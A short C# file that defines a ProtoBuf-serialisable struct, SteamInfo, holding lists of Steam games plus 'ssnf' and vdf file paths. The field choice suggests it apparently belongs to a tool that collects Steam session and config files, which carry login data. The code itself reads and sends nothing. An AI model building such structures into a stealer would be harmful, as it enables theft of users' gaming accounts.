

using ProtoBuf;
using System;


namespace InvokedCommon.Structs
{
	[ProtoContract]
	public struct SteamInfo
	{
		[ProtoMember(1)]
		public string[] games;
		[ProtoMember(2)]
		public string[] ssnfFiles;
		[ProtoMember(3)]
		public string[] vdfFiles;

		public SteamInfo(string[] _games, string[] _ssnfFiles, string[] _vdfFiles)
		{
			this.games = _games;
			this.ssnfFiles = _ssnfFiles;
			this.vdfFiles = _vdfFiles;
		}

		public override string ToString()
		{
			string str = "";
			foreach (string game in this.games)
				str = str + game + Environment.NewLine;
			return str;
		}
	}
}
